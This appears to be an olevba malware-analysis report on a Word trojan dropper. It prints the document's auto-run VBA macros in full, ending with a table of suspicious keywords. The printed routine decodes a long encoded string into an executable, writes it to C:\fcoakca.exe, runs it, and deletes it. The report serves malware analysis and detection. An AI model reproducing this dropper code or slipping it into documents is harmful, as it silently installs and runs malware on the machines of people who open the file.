olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSWord.Lafool.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan-Dropper.MSWord.Lafool.r - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Call cRcAg
End Sub
Sub AutoOpen()
Call cRcAg
End Sub
Sub Document_Open()
Call cRcAg
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Trojan-Dropper.MSWord.Lafool.r - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub cRcAg()
On Error Resume Next
TgAb = 110
vDcSz = "jtkqfgfgfgfgfgfgfgfgfgfgkgjlfgfgjsfhfifgfgfgfgfgfgfgfgfgfgfgfgfgtgfgnvnhfrfhfgfgfgfkfgfgfggufgfgfgfgfgfgkkfhfgfgfgggfgfgfsfgfgfgfgfgjgfgfgggfgfgfgfifgfgfhfgfgfgfgfgfgfgfjfgfqfgfgfgfgfgfgogfgfgfgfifgfgfgfgfgfgfifgfgfgfgfgggfgfghgfgfgfgfgggfgfgggfgfgfgfgfgfgggfgfgfgfgfgfgfgfgfgfgfgfsngfgfgnkfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfglgfgfgfgggfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgtgfgfgrgfgfgfgfgfgfgfgfgfghgfgfgfgmgfgfgntggfgfgfgfifgfgfgfgfgfgfgfgfgfgfgfgfgfgtgfgfgrgnnhlkgngjgfglhokklpkqmnguvgjmjupijrpuvgjmjgmijrguvgjmjgvqmngjhqggguvgjgirgmjuqmliqpqtrtguvkjfofiumnjspfhmlfuuvkjfktrhkpsshtomkhtgjrptrgoohjorhtgfopsuvkjfkirjjuomjfqngusflmjfmnjuomvmnfijhjholnrrlqmfgkmnrunhrugujpkkutrovkuptonptkguvkjggolnrfnjgmoujmlfjuvljfskgkluvkjgkprtrtuijrpjhuvgjgjrpuvgjmiuorjfisimlflnqgmjmgisirjjrjl" _
& "kijujljsijiihulklslsfgfgkpfgkokhkgrjngmquvksfumkfmrmfipgnokqfhlohniohgjgmlihrhimfrttghfgtosruvrvfikjlunggggulqfiiptsiugjjgpkgvjithhiqsinpjqlgvrgmkirlojtiokqkggvnvflqgnjkinrskmkkjrtkogmkqsmnifvuvilnvhjlqtniighnqhpkpghogsrnompqkkmfqmmotflforlinokuvgphilgfnnjrkfskgkkumqtkrruuqfjkrfqqlhkhgjvnmngjmghgijrjkirkpgsnlrgfvsrrhhphhknqpogfirqnkmrpgitgqtohlfhishkhnnvjmloojijhptoukrrglkgfsjhsoogkqpmroqpjkfkkgtksuoksghkoviujjmhpmhgmgtknigpfrsjgkliqtingkiktopnhpkgqontqifhosqojkfitollopjhkpijjgojjiompjnsnognkjtsiqpikhgmnhukupohfpfoknuufqntogggnoflggfnhrsrrjujhlqsttktpvolrgfmhhrkogrororslksgiiskgpsofsssnmjjtghhtkogtorouglkuoinfkjhhifkgpfofsfsnqinfhunsufjmrjjjijljmipprinqohtjhilmpiitrukikihsugkfvimioovrnjkjlijrjinjhujippnqupnjmmtfgltmjljlhgslkmihusslsmofnlvmglllufgkjjvjmkkfgknjhkijlksjtlpljgsmilvmjnvlmmkkvutgululkoumnusfujjmlmiiojkmkkmtpsvthlplvtjuojlmomgmnlssvhimsqqjitsitgghgmsjoiglsmgfvjvlilquqljlnmkkuhliufjjplumgmsiojgkjmmrnfmijiifnjhtnlhujmkltmgnnfljjjskjjpjkfmhikklonknjngfurilnjtlvsrmunnrgnmjmonfipp" _
& "qtfkrhfvrhuvrnhrggqortosjggkgquipujqrhkrqqggrgfugvfnqkfprthhqosmjsfqmhogriqulpmjhgpnnklnijlhltrnhnmlrnmksjlillrnuvfvluopfmlkkkprkgsqonfkftfqhkinnqqltqgokgjlfojsfhmgfjfqghilgopmgkrntgfgnuphfrfhiofigpkhssripkfkmgfpngmqkjtroifpoglkguklgoiphpfhikqinkfqohfppgjtikfpgvfrfhhrgggopgfnimhsolupghhgukojhpiofhkoiuhpfjpgmhmsoikhfsivfhpimgosqgtgfkptgrhitvkmtgqvosghnghpfshokhjggihuljpjoiljqhhooggifmomkonlhognrglrqlpqfklvqvusuvusqposupfjnjtpfhfvnlpvfvtgmlfonvflfmfnggusqpsrhvqhlvfkghrhkhiuhnjjlnkjmgfniokptoiufifmfsttsvtulkfjgvrhjongrgksmluqjgkgglfiggtrgqqstoqltgirkvurfhstuunlrgmkfnijsgtphkfnfipigpfukjfggsnsqjljfhmnrttooopjghuoukkkgimlfifggpuvrssvtmiutomufukpkgfrnmrgmiispgnjmtmvfsgstsilqnfnnsfnfilutggukjrtkvmjfglhkmjhomfqiitoimfnkgqpqrorqjrghohqkoitfgqnrrfvnkriqtinmvfgtvunikgjfkiqlosifphksqtofluoghngnlrjuuiskjnrhnkgthjqgoigongtgvtstotnrgruunkpqnolkufknkniivkjmgrgmokmlrmrfgqqfvuptmtorquuuotoqufghokokplootusirimfnjlgifkqhriugphuusmjvfnumruojgjqmpgntfultuiuumpfvimgpoglnqktngtllqonjohfjmijsnouuhvfifgnogtruhk" _
& "ilprksmrmsjpfgjminusktiotogrgufjgjttuvqnupkmrofnntnofngkqiksiokhsjmkflrrghsorhptssfgoimslqjjprthutupmpmpfrsvqrngokkismjsgutmfjmqtoritukoorqurgmkljjofgomunfkfiqvqhsmuofgtnrpgjfooqutgkkhignrrsjkgnirlpfguuigkmusoitonhuttsmlmofrfumtoophlqhijrggtmngrotgtoksmufgtjntsvqgfhkukrrpfgrigkklnrtsoufskpgmkjhrsrqgimumgtilgtkongtgiqmpmmihftjqfqfhqlhghihlmjrsfplpfngjumrnuulmrvtvmoivjumkfutnlnlvkukvgshhfgtjgviuurqoghfgfhfkngjrnhtsfssufpkmknijsrfgmqsvrifthnuqusfgstlougjpkqkgggoofgojuhrurstosrpjshfgfpjsntfmuinsrnnlfnukfojuqmuspgmpgorrgqiskgomfjkuojongsjgtnunltogqguvturtfgnkillqitkpqvhnopfgnrunpsikqtpqtiuqfgpkqlrjqmmpjktojnfsnpjlfkmlsgsufvorurimonhgskikuomhgntmkgjokjsrfgqnlvtuhppqtogtgvohnrmtrgknjjqqnpgqrkfgqipsiirirhrqsvlufgurqnfojrunkvlmnhfgivjtkqogrliintqlfgpvkmhjtjqrgohgjriufnkigufsfmfggtgrgpsvflkmtoqifgfvglmmjgsuqmlhqjfumqmtjoonfgkjkgmsuongfgsqsotvurgppmfsknfgfpnukpfmniinquokfgugrniikunjuogvmmfvjsjtgqsmnghltkggjofiugtofgurniqgstjjmlgmkjfgmsfjjggkuqflivgvfgfngrukmhjskvhrfkgvnjtskkgigqfgtsknkjsrsmkrhkip" _
& "lutkfgjusorofturkgfggkuouqukqpogohfrhmtjughsfguvhtrjlgtmntfgmtpsknlqfvkpusujfnprkvkgukjuogrtqrgvfofggmtopukqnpollrqifgutmnuvipkornfnisfhqunrjtuonpjvhsrsjnigfvfoukrrqigsrggshgughkhousguqvnmqmrggggkpsimfojofggstolnoquhoplljnfgjthvgqgnsmqmjjujitggtoiokgfghpugfiukgvouqvfvtumngounpggrhitoihqqfghrnjmvirqortutfsogipfgfmnhrqfqiokiivoifghlrisommgujgtofrfhrjtshjgqrumvsruostijfgosrklqfklugvhktsgsrlhotojgspfnmrooupplitghikirsmfgnusoorssrjpuusfgfktvrskgkhlqgjhguitmgmsrisiqfglvkpkqhinrnhgsupiiigmofgujnnrvlsksmvjlfjfsitrutooguptolgptsntufpipfqiqmsfgmqoomllvquipognlgirpmkmnfghnikiuqgumurfgrhkrgufjroltgmlousjkfisruugrrsjrqusukoipnhhrrokhfjfrkgtoqnugfgojfnfktohnmkjhtrughpfhkvgjovptmgujhuurqpjvmlspqplgihfnfnmkhnqruhrptufgojkrkvihfopgsptpuofgjmrgluhjnrkhtrsjfgmjnhrosottstsggoukpuqlngsrhhjkfljouvnjfjjskgkkkorkjhkslglklouuhglsmgmkmouvggmsngnkmvnononsogivokoorkosgvpgpkpotifvpsqkqorgugnjrssgskusjhsotgtktouuhgtsugukuoiofqohnurvushifgfkisuvhpnqmgrqfuljlkmnlpfummpnmqurtofvlhhuqsssmkgtlisvmjptgnmkfhfpkvtquvmvlomn" _
& "potvqkfgqliknkqquifkfglulnmiljhuliitqkmqgmmhommppntnlpmtusutiptmqusqiinhggsinghtgtfngjmtiomgsvptfmigmvklslmhrpgsrtnnoijusorrjnrvrkqvphsksjsqttouqhspfjrususirothrpsotkojsvumrnmtoiujulrvtvqnoisgssljsusohlumsvmjqmgvrlrprvfvfmhrtggssnrtsqqtkqksfgqukptsrrqntlgvljkjmmhisstsfglpllmlhohqnrgutthufnfgpvgljhjppkqomtnitggpmgkhumroitqiqpmjmvftfgjkhhurnvusuvfhjngillmkjsgtftgkjlqgiplvsqfgsmmllslljmlpfgfjkrunsvmujulhltumjhhtgjjjfnuhmkngkklofmlkkoftksfgkvorltflmgghfrmvhkmilpfrlvsmouqtnggvmpjillltuvhhrgskfvkgivliqnivrofvkkgomghghvlojhftnkuoluflrvhpjklpjifgspmhmpgklvlngkttgmhruthmftqpiuqolsutfjsrhmtkmnfsjnkhggnhukjmijgullnugmnhumftmqjhiisshifrfhtilkuvmjlljolhhgivlsfghjjlmmmqqmmkqjkvfhlgmilpigfqlhjmukrlnilvlosknglnfumllrhntkptqgiofhfrkhjvmgikionoigjgftfgkthqmqllqoummmsrfghsrjfrlssqljlhgvfgfpmrtvqghtsslpfqitmgrufsjplmhhqmlujsiulvfgqhkqqrqtotrosvfglnkhmljpmpkmrufmfugrumgnsrlgjhghmjjrllusfufjnvsomrijinggqospftfsfgsjlsrhsskjnoiqklitqurgfvqlnnttjgloiilsjkmlfuingnrqjirgggjuqknmntfkmkkrthhtfungskmgfqspfglmhisllh" _
& "srsqsjtgfhjpfvnuluklkisttssoqifrnjfighpnnhsmlhtsgrjhnvjhmmstgotllitlqhtgfustipqgsgfggujjgqlujtlllkfhkjrignfiqmigmkignllhfjljlrklghfmlsgtlkhthqrvkjgghglmuokhmkktfhhlsgqqkrlrivjotnsgmghkfrfnplmhmlsjjhlgmmnrrtghfiphhvlmlvfvollgnnhsspjohhpvfuflftgmlgglfofqfpfnitfsgqumfvrvltmvupnvfrkphkgktsgnfmtugjmmfnmgfigsmnlrqrrvgifttsfvgufrmvghmnhnmgflfhmvqnursrgjhjfutkfmgtfukjghhgfsjjihgmggnogqjrkpuutkoojtiuttimqoglfghgjpgogshmhjgifghhhlgmgvgngtgkgjtogpfiftfmuikvuqhgsorqguoijsfhttogrpittrhtuugvokrlfjfqfsgggjpsgiqgoqmtnjuuhgiqftjggurtrpfllknutoqgpvmgfhfkjrimhhhnfiggsofmpkfgqrmssvjijtfnigjqfgflinlgjghukjsmmmfgkgiofhsvjrumprjjkojvjjflnsfjqufmngnululhhjiutqlgngjhkkrhurqskrsofgqnskgghnrqrghulpfglkqgjhfmmjpgjrigmugigugplsjgosllrgjvgolnpnsmhprgniiopvhnkgqkfujsrphggqrgmjolktripsfgtuovjjgshntgjmlufgqvgrggiigitnlimvjvijijmpjoniuvsplkfkmshkfougmnmtouljfslgqugsjgtgntrqfsogtqfnknnjrtkjtrftrufifgnqfmjmnofnjnfhsrmlmlfjnrgunjtuusghromittqosskphpgilujsrggqmjmvtvkjfpfvmrhotkihtjngthmiftgrrhtgfomtspuguvhgounpkjrlignqrpft" _
& "mrsphgjhkrgtjjjtstrjrhfinhutniujnvojhgshfhntgkhvuvugusmmfqfvnqfijiolnhjpmluntpljlktjogmvnrfnnjrifknpfnknrnkvfvtpfhmnuhfhrvspjsnihvkunpunqpuifhlgnqkkhstoisfhmumnfjngivfimluinrugnqkvfkfulmrhtofolgrgggnmrkhpguuongtrrqfhugisgmflflfvtispjtutlglknjjofprgmkisqmkguunkgliguknjtsgoujkgjgfouvivomlstmgoolovunngisssnpupknjouiiipuklhqmghskvfnfgnpfjnjrjfktrthlhmsihiorifsjhntmokuusgmqgkriphiistvfjmnghfhrjnrfjjltimmqttjnktrtihkfvnnhhsjlmnrigunfigqlhtpovkhnoqjhumvqpqufkpshqtgjkqpshsihiqigorqonisgotlgiiggnnrfpfkgjrrhlfiksjhukoohriorgkokglgggiknpkmrhkjrhkvosftjlgpkigljprhjvrhjuqshhlmftjmgonohsqtfkhptvuulkhsutfinkfohofqqhjkivhrhponolfkfhqkuiuoksktjspgmktgmitglptglutglnsqotggkssgimqlgsmglmlllvitskkghkqmiiiofpiphonugklirkosgsjsgpgmphjjoijpltqguvlhrqlhmpnuqsllgtlljsksjtolljspqhjgmjopfplmrphgkihumihofmgplhhllpokgllutoolhuhrfhmsopjkfpmjkmishgkimghmsgkktojtrsgplkllljsphlgsjvkioulqpmfumklhrqkkhpkokpkmgmhkkimjkgruilfuhufsihfpiitgimprskoljqfqintolsokhotgmorsutmjfpkvppfmiiopghlnslmiqjjtjkililfpimhpftgmhtnlurllfpgkhp" _
& "kpkkhsfrpptojgolmkmgloggtqgilsitgqsqopsslvjtjqsrmiiponqjhoummhlljsjplnkkiihsoptsmphjfmllhkloiisgppnqugkomnophuiljhknlgnqjmkpmjklfukglioursmmftlkspklfiiujsqojvpmhqtpktqojqismuplrgkqnmmmhlnhkjkgoqlkhsmlntnihnggtipuplnqknjslqlkhlmntgmjnmninifkrollhthioklnhokjfnmpfkmjnskgltotihfkfukvlskisupllusslpfiqhmpkmojrpmihvuilkfihktootnqkknmlmluppjtlspuqmfigjfpfoqgpmqunmoookfojllsfufhiiplhhmoqmgkjkqingnvohquhjnotkrpjooguqihfhskotihtihjgvuihjojolqmkvjjfohjgsnjjrjlkijuoojsijiiiqhujkumtgjhtqkmtmkglpjpgruqilinkjjoiggqfslnklstjufsfrkninjpjufktlkkkifsfnnslvlhnunjlplimiqnhjmpjhkrgsfrhgkgkggmuklktjuvsjmjnuhgmmkifvlnjjlslvkvhtnsjislkjmvlornlmjlmothljmlmktnmgkrqmhnfnmilplurllmfsfsjpggllurujhtmujvjhppjhkrrsgjkuoltjusjmfkijkkhhkohifpkshguggikjlnrommgklolpllristikrmkpnmtslhjlngtjhvjusslhfsnontiothjrfhuqpukqpkjngklmjhfougghjkhhuonphsgnfsfpioqljnutgvpgtpiskhpolqsvgsuojnpppgknohfpllhimhjknnolnppjgiqhhkqvjorrohsnhitjotfitgmvupoofofljinsjkglhlrofpinokjlgkostvgkrnqmpuuisprltrltsuhhnsfnllmkkkigltmgkglhtuloqsmkjnjosvkvlt" _
& "lmrknsfugvkjlpmqtphqptjuugsmfopittjggmjlmumoqsugjrlitsgihkfoguijlrliuoskpjrofupikmshivipivknmppkftstgpkumjuvimljiopgnmfsrvhqluokmirmkjmphgngovjklprvmoljnulvqvlvquijqsjvuqugltqsiupvftlshqftggfpmnfvgikuhtnvoogtkjrqkmlhivlsmlshgvgrfhtutrlgfgfglkngfgfgfgfgfgfgfgfgfgfguifhfgfglkngfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgfgggjgfgfgmgjgfgfgjgjgfgfgfgfgfgkkngjgfgngfgfgfgfgmtfgfgikngjgfgtofhjgfgssfhjgfgsufhjgfgolghjgfglungfgfgmsngfgfgfgfgfgfgjslvlhlkjslplimilhmimpjhfgfgjnllmkkgmilvljjhlklkmillmjmjfg"
Dim CsEvX As String
cHvRs = "C:\fcoakca.exe"
Vdsa = 102
TgAb = TgAb - 7
For Vdeav = 1 To Len(vDcSz) Step 2
CsEvX = CsEvX + Chr((Asc(Mid(vDcSz, Vdeav, 1)) - Vdsa) * 16 + ((Asc(Mid(vDcSz, Vdeav + 1, 1)) - TgAb)))
Next Vdeav
Open cHvRs For Binary As 4
Put #4, , CsEvX
Close #4
Shell cHvRs, vbNormalFocus
Kill cHvRs
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |fcoakca.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

